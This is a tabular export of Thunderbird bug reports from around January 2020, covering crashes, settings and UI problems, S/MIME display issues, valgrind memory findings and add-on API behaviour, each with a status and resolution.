1610800,Crash in [@ nsAbQueryLDAPMessageListener::InitFailed],RESOLVED,--,WORKSFORME,Not a new crash bp-2311a7fc-7a9b-41a7-90d3-b916f0200122. ``` Top 10 frames of crashing thread: 0 xul.dll nsAbQueryLDAPMessageListener::InitFailed comm/mailnews/addrbook/src/nsAbLDAPDirectoryQuery.cpp:228 1 xul.dll nsAbLDAPListenerBase::OnLDAPInit comm/mailnews/addrbook/src/nsAbLDAPListenerBase.cpp:223 2 xul.dll nsLDAPConnection::OnLookupComplete comm/ldap/xpcom/src/nsLDAPConnection.cpp:586 3 xul.dll mozilla::net::DNSListenerProxy::OnLookupCompleteRunnable::Run netwerk/dns/DNSListenerProxy.cpp:35 4 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1175 5 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 6 xul.dll mozilla::ipc::MessagePump::Run ipc/glue/MessagePump.cpp:88 7 xul.dll MessageLoop::RunHandler ipc/chromium/src/base/message_loop.cc:308 8 xul.dll MessageLoop::Run ipc/chromium/src/base/message_loop.cc:290 9 xul.dll nsBaseAppShell::Run widget/nsBaseAppShell.cpp:137 ```
1610806,Message filter system does not follow filter sequence for messages that satisfy multipe rules,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Using Thunderbird 68.4.1 (64-bit) on linux mint 19 Receive a mail with subject ""[K] 123"" from fritz.mueller@mueller.de There are 2 filters defined, that move matches to dedicated mail folders: 1. Subject contains [ĸ] Move to Folder 1 2. From is fritz.mueller@mueller.de Move to folder 2 Old TB executed rule 1 in cases like this. Recent TB versions use rule 2. Actual results: TB does not execute the first rule *in the filter list*, that matches a mail. Expected results: Rule priorities are defined implicitly by position in the filter list. The first rule that matches a mail, should be executed. For me this looks like buggy code optimization…"
1610858,account settings failure,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: tried to whitelist an email address that got stuck in junk folder of webmail Actual results: I get a strange little pop up with no use or sense whenI try to enter in account settings. Same thing with trying to join chat... Expected results: Should have reached account settings like always with incoming server, outgoing stmp etc etc..."
1610874,'Use fixed width font for plain text messages' font type and size cannot be changed,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Recently upgraded from Thunderbird 60 to v68 (68.4.1), and found that the font used to display message bodies in my Sent mail folder is too small. I can use the Zoom function to make the text larger, but that doesn't stick between restarts. Options>Display>Formatting>Advanced -Uncheck the 'Use fixed width font for plain text messages' -Check the 'Use fixed width font for plain text messages' Actual results: -Uncheck the 'Use fixed width font for plain text messages' - this results in the message body using a proportional font that can be sized with the settings. -Check the 'Use fixed width font for plain text messages' results in the message body using a mono-spaced font whose type and size cannot be adjusted. Expected results: -Checking the 'Use fixed width font for plain text messages' should allow the user to control the type and size of the mono-spaced font (default: Consolus) from that Advanced options pane."
1611001,Thunderbitd CPU at 100% (v68.4.1 on archlinux),RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.14.0 Chrome/77.0.3865.129 Safari/537.36 Steps to reproduce: This happens every time I open TB. I come from this Wayne comment suggesting to open a bug here... Actual results: After some minutes I open TB it starts to eat my cpu and being really slow and unresponsive. I dont know what info do you need from me to debug this, but I'm willing give it a try if anyone can guide me. This is the first bug I write :) Thank you for the hard work, I love Thunderbird!"
1611017,V 73.0b1 Unable to login at server - peer using unsupported protocol,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Two days ago my thunderbird was updated from 72.0b3 to 73.0b1 (32bit). POP3 and SMTP settings: STARTTLS and Normal password Actual results: The new version is unable to download any new emails from the server even though they can be seen through a web interface: the status message 'connected to mail.tpg.com.au' is displayed for a few seconds and then disappears. Emails cannot be sent either: 'Sending message failed - peer using unsupported protocol'. I reinstalled the previous version and was obliged to create a new profile - all worked as expected - emails could be sent and received - but of course earlier emails and contact list were not accessible. Created a separate installation of 73.0b1 (64bit) and a new profile and the same problems occurred. The attachments show two steps in the creation of the new profile with automatic server configuration. The second shows there was a problem logging into the server using IMAP, but when the protocol was changed to POP3, it was accepted. Nevertheless the installation was unable to receive or send emails."
1611049,Attachments Opening with Incorrect Application v68.4.1 (32-bit),RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I may have a MS Word document attached to either an outgoing email or a sent email in my sent folder. I double-click the attachment. I did the same thing with an attached Excel file. Actual results: Thunderbird activates my PDF reader to open the MS Word or Excel document. Expected results: MS Word should have opened and that is what I have in the Tools=>Options=>Attachments assignment. Content Type: Microsoft Word Document Action: Use Microsoft Word (default) No listing for the Excel file type. Both of the associations are clearly made in the Windows 10 Pro default applications. Thunderbird does not understand default associations right now for some reason.
1611074,s/mime certificate can not be found. Not a dup of bug 531073,RESOLVED,--,INVALID,"Since 68.4. I have been getting this message Unable to save your message as a draft. You specified that this message should be digitally signed, but the application either failed to find the signing certificate specified in your Mail & Newsgroup Account Settings, or the certificate has expired. I had not changed the certificate for almost a year, but upon checking it is valid until Sunday, February 23, 2020 Issued by Common name (ca) Actalis Client Authentication CA G1 Organization (o) Actalis S.p.A./03358520967 Organizational Unit (ou) <Not Part Of Certificate> The fact there is an error is bad enough, but having the write window steal focus from not only Thunderbird, but whatever program has focus, to give me this message every time it tries to save a draft is infuriating. Between that and the system not remembering the SSL certificate offered to Yahoo and Freenode I am getting quite frustrated."
1611105,TB crashes during opening s/mime signed mail from mailman mailinglist,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Symphtom: ========== Forward a S/MIME signed mail to a mailman mailinglist AND signe it with S/MIME again and send the forwarded mail as attachment. Now open the mail and Thunderbird crashes. I don't know if this problem causes other security risks. Unless you have checked this I would mark this problem as harmful security problem. Feel free to ""unckeck"" this and open this bug for world access/read. Affected TB versions round about above v60. TB crashes on Linux and Windows, too. Other architectures not tested. We have tested the Horde Webgroupware and Thunderbird as sending/composing MUA but makes no different. Fast test to reproduce: ==================== Open the attached eml file. :-/ Workarounds: ============= 1st: Do not signe the fwd mail to the list OR 2nd: Do not send the fwd mail as attachment Actual results: TB crashes during opening the mail. Expected results: TB should show/open the mail and not crash... (:"
1611114,Non-default identity used for reply to email addressed to multiple identities,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Email account with multiple identities - default@somedomain.com (default identity) - other@otherdomain.com Send email to both addresses, with non-default listed first... To: <other@otherdomain.com>, <default@somedomain.com> Reply to email in Thunderbird Actual results: The From identity selected when replying is the first listed email address in the To field (i.e. other@otherdomain.com in this example) Expected results: When an email is sent to multiple identities, I would expect the default identity to be used when replying."
1611164,SIGSEGV with sqlite 3.31.0,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Update sqlite to v3.31.0. Actual results: Thunderbird crashes even using safe mode with the following backtrace: Thread 27 ""Cookie"" received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7fffe5213700 (LWP 7431)] 0x00007ffff0a58f00 in ?? () from /usr/lib/thunderbird/libxul.so (gdb) bt #0 0x00007ffff0a58f00 in () at /usr/lib/thunderbird/libxul.so #1 0x00007ffff0a52339 in () at /usr/lib/thunderbird/libxul.so #2 0x00007fffef082440 in sqlite3WalOpen () at /usr/lib/libsqlite3.so.0 #3 0x00007fffef041aa9 in () at /usr/lib/libsqlite3.so.0 #4 0x00007fffef044f35 in sqlite3PagerOpenWal () at /usr/lib/libsqlite3.so.0 #5 0x00007fffeefd742e in sqlite3BtreeBeginTrans () at /usr/lib/libsqlite3.so.0 #6 0x00007fffef04e547 in sqlite3InitOne () at /usr/lib/libsqlite3.so.0 #7 0x00007fffef04e6dd in sqlite3Init () at /usr/lib/libsqlite3.so.0 #8 0x00007fffef04e730 in sqlite3ReadSchema () at /usr/lib/libsqlite3.so.0 #9 0x00007fffef04c7b9 in sqlite3Pragma () at /usr/lib/libsqlite3.so.0 #10 0x00007fffef04734a in sqlite3Parser () at /usr/lib/libsqlite3.so.0 #11 0x00007fffef06679d in sqlite3RunParse"
1611192,Thunderbird Client cannot send mailing lists with spaces,RESOLVED,--,WORKSFORME,"Discovery: Through personal use. Steps to reproduce: 1. Create a mailing list 2. Name the mailing list with one or more spaces in its name 3. Try to send an email via the mailing list (CC or BCC) 4. The ""Send"" button is grayed out, thus a mail cannot be sent Thunderbird version: 68.3.0 (32-Bit)"
1611259,"becomes unresponsive, displays menus and window improperly, and/or OOM crashes after updating to 68.4.1",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Basic tasks such as hitting REPLY, attempting to attach a file, typing a medium length email Actual results: Program becomes unresponsive, displays menus and window improperly, and/or crashes completely. Accessibility: Active AccessibilityInProcClient: 0x400 AdapterDeviceID: 0x1616 AdapterDriverVersion: 20.19.15.4642 AdapterSubsysID: 381c17aa AdapterVendorID: 0x8086 Add-ons: %7B58D4392A-842E-11DE-B51A-C7B855D89593%7D:3.0.0beta5,wetransfer%40extensions.thunderbird.net:2.0.0,default-theme%40mozilla.org:1.0,google%40search.mozilla.org:1.0,amazondotcom%40search.mozilla.org:1.1,bing%40search.mozilla.org:1.0,ddg%40search.mozilla.org:1.0,twitter%40search.mozilla.org:1.0,wikipedia%40search.mozilla.org:1.0 AvailablePageFile: 10047356928 AvailablePhysicalMemory: 9074921472 AvailableVirtualMemory: 557772800 BIOS_Manufacturer: LENOVO BlockedDllList: BreakpadReserveAddress: 115998720 BreakpadReserveSize: 83886080 BuildID: 20200108224327 CPUMicrocodeVersion: 0x2b ContentSandboxCapable: 1 ContentSandboxLevel: 1 CrashTime: 1579810694 Email: max@anasuya"
1611312,Beta 73.0b1 address autocomplete delay when composing,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: When in Sending mode, while entering recipient address, Thunderbird Beta 73.0b1 begins hanging. Actual results: May hang from 10 seconds to one minute while trying to create message in Sending mode. After recovery, it may hang two to four times before message is ready to send. Expected results: No hanging should occur when entering address characters and when typing message. With previous versions of Thunderbird up to Version 68, there was never hanging. PC is W7-64, 2TB HHD and 32Gb RAM Cached RAM averages 20Gb."
1611349,"Empty Add-On Preferences in menu bar (workaround, use APPmenu) on Mac",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: MacOS Catalina 10.15.2 Open Thunderbird. Tools > Add-on Preferences menu has no content. Currently have three Extensions: Lightning, Send Later and SmartTemplate4 Actual results: No content Expected results: Should see preferences for each Add-on"
1611354,"When saving message as text, Thunderbird still adds .eml instead of .txt",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open Thunderbird. File > Save As > File Format > Text Files Save Actual results: Saved as .eml, which makes it harder to open with Textedit. Expected results: Save as .txt Previously reported and closed as Bug 13789291"
1611375,Thunderbird custom IMAP/POP/SMTP can't accept a port number which is longer than 3 digits,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried to register an email account. Actual results: Thunderbird couldn't accept the port number ""1143"" etc. Expected results: Thunderbird shouldn't limit the port number."
1611405,account setup should prefer standard protocols over exchange,RESOLVED,--,FIXED,If an exchange account type is detected via autodiscover.xml it will usually (always?) be the listed in the xml above the standard protocols. Therefore it will become the default in the config we use. This is clearly incorrect. If standard protocols are listed they should be preferred. In fact it was never the intention to even show exchange for that case.
1611488,Attached signed message not displayed in signed messages,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Send a signed message to yourself (S/MIME, X.509). Forward this message as attachment to yourself and sign the forwarded message again (S/MIME, X.509). As an alternative, attach any signed message (S/MIME, X.509) to a signed message. Actual results: The forwarded message shows the attached message headers, but not the mail content. The message source shows the content of the attached mail. This bug does not occur when the forwarded message is not signed. I let display attachements inline. I am on Windows 10, Thunderbird is of version 68.4.2 (32 Bit). I also have Engimail, but it is actually not used here. Expected results: The attached mail message should be displayed inline with headers and content."
1611489,Downloading Thunderbird AddOns am also getting virus,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Hello to all, Am getting a notice from McAfee everytime I download a new AddOn from the Extensions Manager with in Thunderbird 68.4 (64 bit). Thought you all might want to know this is going on. Actual results: As I am downloading and installing the Extension(s): Allow HTML Temp ReFwdFormatter Provider for Google Calendar *McAfee reports that a virus tagged along and was blocked, each one seems to be a different virus (although I could be the same as I was not watching all that closely). Expected results: These AddOns should have installed without any notification from McAfee."
1611562,"When restart Thunderbird, previously open message tabs don't reappear",RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: - Use setting to open messages in new tabs - Open messages - Close Thunderbird - Restart Thunderbird Actual results: The messages don't reappear. Expected results: The messages should reappear. This was happening until this week. This feature is one of Thunderbird's main selling points for me.
1611567,"C-C TB uninitialized memory access during xpcshell-test, comm/mailnews/base/test/unit/test_postPluginFilters.js, Uninitialised value was created by a stack allocation at ... nsMsgDatabase::SetStringPropertyByHdr(nsIMsgDBHdr*, char const*, char const*)",RESOLVED,--,FIXED,"Here is yet another one of the uninitialized memory accesses during a run of C-C TB xpcshell-test under valgrind. I have a feeling that this problem will result in incorrect processing of filters, but I am not sure. Anything goes actually. I am attaching a log from serialized verbose run of xpcshell-test. The line numbers in the log may be slightly off due to local changes. It contains a lot of local debug dump, but you can discern the valgrind output. (I am running xpcshell test by saving xpcshell binary into a file named |xpcshell-bin| and then create a binary named |xpcshell| that actually runs |xpcshell-bin| under valgrind. Lines such as the following are from this wrapper: ``` 73:41.81 pid:462226 sizeof(prepargs)=120 73:41.81 pid:462226 argc=31 73:41.82 pid:462226 finalargs[ 0] = /usr/local/bin/valgrind 73:41.82 pid:462226 finalargs[ 1] = --track-origins=yes 73:41.82 pid:462226 finalargs[ 2] = --trace-children=yes ... ``` The test that triggers the uninitialized errors is comm/mailnews/base/test/unit/test_postPluginFilters.js All uninitializsed value(s) were created in the following function. ``` Uninitialised value was created by a stack allocation at 0x59E22AA: nsMsgDatabase"
1611584,xpidl.xpidl.IDLError: error: Interface 'nsIAbBooleanConditionTypes' must inherit from nsISupports,RESOLVED,--,FIXED,"With c-c and m-c on tip I get following failure: xpidl.xpidl.IDLError: error: Interface 'nsIAbBooleanConditionTypes' must inherit from nsISupports, z:/Mozilla/comm-central/comm/mailnews/addrbook/public/nsIAbBooleanExpression.idl line 19:0 Backout of bug 1611173 let me build successfully."
1611612,"Tooltip missing on icons for column header options, aka column picker/selector",RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tooltip missing on icons for column header options. This applies to the 'Folder Pane Columns' and the 'Thread Pane' column headers. It also applies to the 'Address Book' column headers. In each case, there is a small icon located immediately to the right of the column headers sited above the vertical scrollbar, if it is shown. Hover over these icons. Actual results: Hovering over these icons does not offer a tooltip. When people have an issue with a column header, there is no tooltip saying what it is. So you cannot offer instructions like when you hover over it, the tooltip will say etc... People do struggle to locate it, especially if unfamiliar with email client or eyesight is poor. As the icon is small and difficult to put in words, whilst assisting in the Support forum, I have discovered people struggle to locate it without a fully diagramatic image. Expected results: All the actual column headers do have tooltips. There should be a relevant tooltip over the icon(s) which facilitates selection or restoring column order etc."
1611636,Attachments not aligned properly in attachment pane on trunk 74 of 2020-01-25,RESOLVED,--,FIXED,"See picture. This should be aligned horizontally. Alice, can you please find the regression."
1611671,"""Debug Add-ons"" freezes Thunderbird when hitting a breakpoint",RESOLVED,--,WORKSFORME,"STR * Have a WebExtension that does something when you click a button. * Go to Tools -> Developer -> Debug Add-ons * Set a breakpoint on the button action. * Click the button (it doesn't have to be a button/action, a breakpoint to hit is the main thing here). Actual Results * Thunderbird, the add-on debugger and the error console all freeze. Expected Results * You can debug and continue working. I'm on 68.4.2 on Mac, I don't know if this is a regression or not. My best guess for a starting point is that the add-on debugger is attempting to interrupt the add-on process, but I assume Thunderbird WebExtensions are currently running in the main process, so the add-on debugger is interrupting itself. Workaround: Use the main developer toolbox. If we can't fix this easily, we should at least make sure developer docs are updated to make it really clear that this isn't going to work. Especially with the push to WebExtensions."
1611708,"C-C TB uninitialized memory access during xpcshell-test comm/mailnews/local/test/unit/test_over4GBMailboxes.js, Uninitialised value was created by a stack allocation at nsFolderCompactState::OnDataAvailable(nsIRequest*, nsIInputStream*, unsigned long.",RESOLVED,--,WORKSFORME,"Yet another and final unitialised memory access during xpcshell-test that I am aware of. (There could be a few more if I can run all the test of xpcshell-test under valgrind. Due to slower execution, some tests timeout and I cannot run them fully.) This is the valgrind error signature: ``` 37:10.97 pid:600151 ==600151== Conditional jump or move depends on uninitialised value(s) 37:10.97 pid:600151 ==600151== at 0x5829CCB: nsFolderCompactState::OnDataAvailable(nsIRequest*, nsIInputStream*, unsigned long, unsigned int) (nsMsgFolderCompactor.cpp:763) 37:10.97 pid:600151 ==600151== by 0x5B568DB: nsMailboxProtocol::ReadMessageResponse(nsIInputStream*, unsigned long, unsigned int) (nsMailboxProtocol.cpp:605) 37:10.97 pid:600151 ==600151== by 0x5B57037: nsMailboxProtocol::ProcessProtocolState(nsIURI*, nsIInputStream*, unsigned long, unsigned int) (nsMailboxProtocol.cpp:684) 37:10.97 pid:600151 ==600151== by 0x58CF74E: nsMsgProtocol::OnDataAvailable(nsIRequest*, nsIInputStream*, unsigned long, unsigned int) (nsMsgProtocol.cpp:298) 37:10.97 pid:600151 ==600151== by 0x5FC553B: nsInputStreamPump::OnStateTransfer() (nsInputStreamPump.cpp:571) 37:10.97 pid:600151 ==600151== by 0x5FC5C49: nsInpu"
1611749,Undo of deleted Pills not working as expected.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Take any mail with 4 recipients: (pill1) (pill2) (pill3) (pill4) focus and select pill3. Press delete, remove pill3 Press ctl + Z / Undo, all (pill1) (pill2) (pill3) (pill4) comes instead of pill3. Actual results: 1st deletes pill3. On Undo, (pill1) (pill2) (pill4) + (pill1) (pill2) (pill3) (pill4) is coming to recipients list. This is unexpected. Expected results: On undo, Should return pill3 only. Not (pill1) (pill2) (pill3) (pill4)."
1611758,OSX perma fail on Thunderbird - toolkit/components/telemetry/tests/unit/test_TelemetryController.js | xpcshell return code: 0,RESOLVED,P5,WORKSFORME,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286586188&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/AFQzIstyTtCPHsFMZ9tpJQ/runs/0/artifacts/public/logs/live_backing.log ---
1611766,Thunderbird not changing automatically to day/night Mac auto theme,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: TB themes set to default theme to follow theme set by Mac Auto theme which changes with day and night. Problem with TB is change from night to day. Actual results: Problem with TB is change from night to day where TB remains in partial dark mode. Can be eliminated by changing to light theme and then back to default, but reoccurs the next morning. Expected results: TB should follow Mac auto theme from night to day."
1611783,Junk status flag not removed when removing mail from Junk folder,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Thunderbird 68.4.2 (64-Bit) on Ubuntu 19.10 - Press ""j"" to mark an email as junk - The email goes to Junk folder - Press CTRL+Z to restore the email back (ore drag manually it back with the mouse) Actual results: When putting back the email in the Inbox the junk flag is still there Expected results: When putting back the email in the Inbox the junk flag should be removed"
1611793,Add Cc/Bcc addressing field should be reported to screen reader as button,RESOLVED,--,FIXED,"Hello, Steps to reproduce: 1) Launch a screen reader like Orca or NVDA (optional) 2) Open the message compose window 3) Press shift + tab two times to go on ""CCi / BCC"" (I've the French version so I don't known the exact English word) Result with the screen reader: It says ""CCi / BCC"" or ""CC"" label Expected result: The reported type of those element should be button because it should be and also for consistency because in all over the OS the user never hears ""label"" but only ""XX button"". Best regards."
1611805,Chat Input Box Does Not Respect Resizing,UNCONFIRMED,--,,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Attempted to resize the chat input box to not take up 5 lines Actual results: 1) Open Chat - input box will be 5 lines tall 2) Resize input box to 1 line 3) Close Thunderbird 4) Open Thunderbird 5) Open Chat - input box will be 5 lines tall Expected results: 1) Open Chat - input box will be 5 lines tall 2) Resize input box to 1 line 3) Close Thunderbird 4) Open Thunderbird 5) Open Chat - input box will be 1 line tall
1611861,Indenting numbered lists creates invalid HTML ol elements,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. On a blank email, create a numbered list with the toolbar button 2. Add some entries to this list 3. Indent some of these entries 4. Save the resulting email as an HTML file (File > Save As > File) Actual results: The resulting HTML contains <ol> elements directly within the top-level <ol> - see the example below. Note that this causes issues in the display of the <li> numbers as reported in bug #1548753. <ol> <li>Top level entry one<br> </li> <ol> <li>Indented entry one</li> <li>Indented entry two<br> </li> </ol> <li>Top level entry two<br> </li> <ol> <li>Indented entry one<br> </li> </ol> </ol> Expected results: All nested <ol> elements should be contained within an <li> element, as below. <ol> <li>Top level entry one<br> <ol> <li>Indented entry one</li> <li>Indented entry two<br> </li> </ol> </li> <li>Top level entry two<br> <ol> <li>Indented entry one<br> </li> </ol> </li> </ol>"
1611880,"add-ons run at unpredictable timing (should interactive, but complete)",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I've developed a quick filter bar custom button addon. - https://addons.thunderbird.net/ja/thunderbird/addon/quickfilter-watched-threads/ To migrate TB 68, I tried to use MailExtention with legacy support both overlay and bootstrap, but failed both. Actual results: While developing locally, addon runs in 'interactive' state. But when I uploaded my addon to registory and install it to TB from network, my addon does not work correctly, because addon runs in 'complete' state of document.readyState. Quick filter buttons must be added in 'interactive' state, because click event handler is injected to buttons when window.onload() is invoked. Expected results: addon is guaranteed to run in 'interactive' state."
1611882,Unable to verify OTR fingerprint,RESOLVED,--,FIXED,"Disclaimer, this is a try build but I expect it would be a problem on a regular daily build as well. 74.0a1 (2020-01-28) (64-bit) When using OTR with IRC, I'm not able to verify the peer's fingerprint in Thunderbird. To reproduce: - Start a conversation with someone over IRC. Encryption status says ""Insecure"". - Click the encryption button, select ""Start encrypted conversation"". The other end indicates that the connection has gone secure and Thunderbird has the message to Verify contact's fingerprint. (See screenshot, there's a UI/CSS problem here too) - Encryption status now says ""Unverified"" - Click the ""Unverified"" button and select ""Verify your contact's identity"" Expected: - The otr-auth dialog should show Actual: - Broken XUL dialog. See screenshot."
1611887,"""Not responding"" - Thunderbird frequently hangs up and doesn't allow user input after clicking on Unified Inbox. Caused by slow procssing of large list of imap UID when using ""search online""",RESOLVED,--,DUPLICATE,"I am running Thunderbird Daily on a fast i7-7700hq processor with an SSD and two email accounts -- and I frequently get Thunderbird letting me know that I can't use it (Windows says the app is not responding). I experienced similar issues in Linux as well. I don't know how to diagnose the issue further, so please advise how I can provide more information."
1611918,Compose textboxes are coloured unreadable in the default theme,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Using Windows 10 1903 Build 18362.592, Thunderbird 73.0b1 (32-bit) 1. Make sure the system style is set to ""Dark"" (not sure if this affects it) 2. Make sure the Thunderbird theme is set to ""Default"" 3. Open the compose window by clicking on ""Write"" Actual results: The textboxes for From, To and Subject are coloured white on white, making them unreadable. Expected results: The textboxes for From, To and Subject should be coloured white on dark to blend in with the rest of the window. Additional Information: - Thunderbirds ""Dark"" Theme does this correctly. (See image) - When hovered or focused, the textboxes are also coloured correctly."
1611995,Messages list not being passed to menu onclick callback,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: I created a simple extension to test the Menu API. The manifest defined a background script. In the background script I added the menu: ``` browser.menus.create({ id: ""test-message-list"", title: ""Test Message List"", contexts: [""message_list""] }); browser.menus.onClicked.addListener((info) => { console.log(info.selectedMessages); }); ``` The menu item appears on the context menu when I right click on a message. Operating Environment: * Thunderbird 68.4.2 (32-bit) * Windows 10 Professional 64bit 10.0.18363 Actual results: `undefined` was logged to the console. Expected results: A list of selected messages should appear in the console."
1612002,version 68.4.2 sometimes ignores keyboard and mouse,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Previous version was working as expected. Installed release Thunderbird 68.4.2 Created a new email Firefox, Pages and other applications behaving normally, not having these problems. Actual results: Keyboard and mouse inputs sometimes ignored. Click on write for new message. Click on message body. Cursor still on To: box, wait for about 5 seconds and cursor moves to message body. Start typing, nothing happens, a few seconds later my characters show up. Enter enough text so that scroll bar shows up on right side. Click on scroll bar and drag and nothing happens. Move roller wheel on mouse and nothing happens. Also, new messages always fill the whole screen. I reduce the size of the message and expect the next new message to be that size but new messages are always full screen. Expected results: All keyboard and mouse inputs immediately processed. New messages are at the same size as the previous new message."
1612008,"Update 60 to 68.4.2 lost all folders. The profile was found in Roaming\Thunderbird Zip\ (Update said to restart, Restarted, got message that Thunderbird was updating. then computer restarted",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Updated by clicking Update to 68.4.1 under Tools-Options-Advanced Actual results: Update said to restart. Restarted computer and then got message that Thunderbird was updating. Then computer restarted. Opened Thunderbird and everything was lost and version 68.4.2 was shown. Expected results: Expected to see new version with no change to any settings or folders."
1612020,TB68> - multiple spellcheck dictionaries for a country not supported?,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: For Czech language there are two dictionaries available - with and without accents. I liked to have installed both and switch between them as needed. Actual results: Since TB68 only one dictionary appears in the spell check selector (labeled Czech) even when both dictionaries are installed Expected results: two different items in the spell check selector when two dictionaries for a language are installed"
1612055,"Default order of thread pane columns changed: all iconic columns first (Thread, Starred, Attachments, Read, Junk Status /spam), then text columns: error-prone, useless UI.",RESOLVED,P1,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Upgrade my nightly The problem is that now, the status of the message (read and spam) are in the 3 first columns. While the read status may be useful for some users, the spam score is a pain for a blind people, because the voice speaks it, but a basic users has no idea about what is this number. Actual results: Could you put this info rather on the last column please? Or making the change of columns order accessible (today, impossible without a mouse). Thanks Regards"
1612074,Wrong timestamp in date column of forwarded email,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Header of email message is attached to bugreport. First step: initial_sender@yandex.ru sent his email to forwarder_mail@mail.ru at 6 Dec 2019 21:59 Second step: forwarder_mail@mail.ru forwarded this email to receiver_mail@some_server.ru at 29 Jan 2020 11:14 Third step: The message to receiver_mail@some_server.ru reaches thunderbird mail client at 29 Jan 2020 11:34 Actual results: Message timestamp in messagelist date column is 06.12.2019, 21:59 Expected results: Message timestamp in messagelist date column should be 29.01.2020, 11:14 Same message in MS Outlook looks fine."
1612081,"thunderbird don't collect messages , version 73.0b1 (64-bit)/ OSX Mojave",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I launch IT Actual results: Nothing, It just indicate 'connected to free.fr' In the console 'configd dhcp_arp_router: en1 SSID unavailable Expected results: Nothing, no connection"
